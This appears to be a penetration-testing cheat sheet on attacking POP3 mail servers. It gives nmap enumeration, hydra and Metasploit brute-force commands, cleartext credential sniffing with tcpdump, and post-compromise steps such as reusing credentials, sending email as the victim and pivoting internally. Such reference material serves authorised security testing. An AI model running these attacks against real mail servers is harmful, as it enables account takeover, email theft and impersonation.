```table-of-contents
```

!!! tip "Start here"
    Connect directly: `nc <target> 110` then `USER <username>` / `PASS <password>`. Once authenticated, `LIST` shows available messages and `RETR 1` downloads the first one. Emails often contain credentials, password resets, or internal info worth reading before moving on.

## Enumeration
### Banner Grabbing
```bash
nmap -p 110,995 -sV --script=pop3-capabilities <target-ip>
```

## User Enumeration
```bash
nmap --script pop3-brute -p 110 <target-ip>
```

## Authentication Attacks
### Brute Force Credentials
```bash
hydra -L users.txt -P passwords.txt -s 995 <target-ip> pop3s -V
```

Metasploit:
```bash
msfconsole
use auxiliary/scanner/pop3/pop3_login
set RHOSTS <target-ip>
set USER_FILE users.txt
set PASS_FILE passwords.txt
run
```

## Misconfigurations
## Insecure Authentication
If authentication is in cleartext (port 110) and TLS is not enforced, credentials may be sniffed using tcpdump or wireshark.
```bash
tcpdump -i eth0 port 110 -A
```

Some POP3 servers allow plaintext authentication (`PLAIN` or `LOGIN` methods), which can be intercepted over **unencrypted connections**.
```bash
openssl s_client -connect <target-ip>:110 -starttls pop3
```

Check for `AUTH PLAIN` or `AUTH LOGIN` in the response:
### Post-Exploitation & Lateral Movement

If POP3 credentials are compromised:

1. **Check for IMAP Access (Port 143/993)** – The same credentials might work for **IMAP**, allowing deeper email access.
2. **Try SMTP Authentication (Port 25/465/587)** – If SMTP allows authentication, **send emails as the victim**.
3. **Re-use Credentials for Other Services** – Many users **reuse passwords**, allowing privilege escalation across different services.
4. **Pivot to Internal Systems** – If the compromised user is an **IT administrator**, access **internal infrastructure**.